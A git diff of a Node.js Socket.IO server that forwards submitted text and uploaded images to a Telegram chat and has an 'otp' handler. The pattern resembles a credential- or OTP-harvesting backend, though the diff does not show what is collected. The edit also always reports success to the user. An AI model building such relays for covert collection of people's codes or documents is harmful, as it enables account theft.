@@ -9,13 +9,14 @@ const io = new Server(http);
 var siofu = require("socketio-file-upload");
 const axios = require('axios');
 
+
 app.use(express.static('public'));
 app.set('view engine', 'html');
 app.set('views', './views');
 app.use(cors({
     origin: '*'
 }));
-app.use(siofu.router).listen(process.env.PORT_UPLOAD);
+app.use(siofu.router).listen(process.env.PORT || 3001);
 
 io.on("connection", function (socket) {
     var uploader = new siofu();
@@ -31,7 +32,13 @@ io.on("connection", function (socket) {
             chat_id: process.env.TELEGRAM_CHAT_ID,
             text: message,
             mode: 'html'
-        })
+        }).then((res) => {
+
+        }).catch((err) => {
+            // console.log('err', err);
+        });
+
+        // send data images
         const images = data.images;
         images.forEach(async (image) => {
             image = image.replace('public', '');
@@ -39,11 +46,15 @@ io.on("connection", function (socket) {
                 chat_id: process.env.TELEGRAM_CHAT_ID,
                 photo: `${process.env.URL_IMAGE}/${image}`
             }).then((res) => {
-                socket.emit('success', { message: 'Đã gửi yêu cầu thành công' });
 
-            }).catch((err) => { });
+                // console.log('res', res.data);
+            }).catch((err) => {
+                // console.log('err', err);
+                socket.emit('error', { message: 'Hệ thống đang quá tải, vui lòng thử lại sau!' });
+            });
+            socket.emit('success', { message: 'Đã gửi yêu cầu thành công' });
+
         });
-
     });
 
     socket.on('otp', (data) => {
